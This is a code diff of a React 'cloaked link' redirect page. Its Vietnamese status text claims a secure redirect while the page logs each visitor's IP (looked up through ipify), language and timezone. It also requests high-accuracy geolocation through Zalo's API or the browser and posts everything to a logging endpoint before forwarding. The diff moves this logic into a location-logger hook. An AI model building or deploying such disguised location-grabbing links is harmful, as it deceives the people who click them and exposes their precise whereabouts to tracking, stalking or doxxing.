@@ -1,9 +1,9 @@
-
 'use client';
     
 import { useEffect, useState } from 'react';
 import { Loader2 } from 'lucide-react';
 import type { CloakedLinkConfig } from '@/app/actions/cloaked-links';
+import { useLocationLogger } from '@/hooks/use-location-logger';
 
 interface RedirectClientProps {
   config: CloakedLinkConfig;
@@ -12,71 +12,26 @@ interface RedirectClientProps {
 export function RedirectClient({ config }: RedirectClientProps) {
   const { id, redirectUrl } = config;
   const [statusText, setStatusText] = useState('Đang chuyển hướng an toàn...');
+  
+  const { log } = useLocationLogger('/api/log-cloaked-link', { id });
 
   useEffect(() => {
-    const logLocationAndRedirect = async () => {
-      let clientIp = 'N/A';
-      try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        if (ipResponse.ok) {
-          const ipData = await ipResponse.json();
-          clientIp = ipData.ip;
-        }
-      } catch (e) {
-        console.error("Could not fetch IP", e);
-      }
-
-      const sendLog = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
-        const body: any = { 
-          id,
-          ip: clientIp, 
-          language: navigator.language,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        };
-        
-        if (pos) {
-          body.lat = pos.coords.latitude;
-          body.lon = pos.coords.longitude;
-          body.acc = pos.coords.accuracy;
-        }
-
-        fetch('/api/log-cloaked-link', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(body),
-          keepalive: true,
-        }).finally(() => {
+    const logAndRedirect = () => {
+      setStatusText('Đang xác minh và chuyển hướng...');
+      log({
+        onSuccess: () => {
           window.location.href = redirectUrl;
-        });
-      };
-
-      const handleError = () => {
-        // Log without location and redirect.
-        sendLog();
-      };
-
-      if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
-        (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
-            if (data.status === "SUCCESS" && data.latitude && data.longitude) {
-                sendLog({ coords: { latitude: data.latitude, longitude: data.longitude, accuracy: data.accuracy || 15 } });
-            } else {
-                handleError();
-            }
-        });
-      } else if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          sendLog,
-          handleError,
-          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-        );
-      } else {
-        handleError();
-      }
+        },
+        onError: () => {
+          // On any error, just log without geo and redirect
+          window.location.href = redirectUrl;
+        }
+      });
     };
-    
-    const timer = setTimeout(logLocationAndRedirect, 500);
+
+    const timer = setTimeout(logAndRedirect, 500);
     return () => clearTimeout(timer);
-  }, [id, redirectUrl]);
+  }, [log, redirectUrl]);
 
   return (
     <div className="flex justify-center items-center min-h-svh bg-background p-4">
